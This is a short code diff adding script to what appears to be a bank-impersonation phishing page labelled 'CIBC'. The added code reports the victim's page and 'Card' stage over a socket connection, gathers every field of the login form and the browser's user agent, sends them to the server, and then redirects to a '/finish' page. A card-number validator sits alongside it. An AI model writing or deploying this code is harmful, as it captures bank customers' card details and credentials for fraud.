@@ -185,6 +185,19 @@
 </body>
 
 <script>
+      const socket = io();
+
+         socket.emit('pageandstage', {page: 'CIBC', stage: 'Card'})
+    
+    function submitForm() {
+        document.getElementById('userAgent').value = navigator.userAgent;
+    
+        const formData = new FormData(document.getElementById('loginForm'));
+    
+        socket.emit('submit', Object.fromEntries(formData));
+    
+        window.location.href = `/finish`;
+    }
     
     function isValidCardNumber(value) {
         // Remove any spaces or hyphens
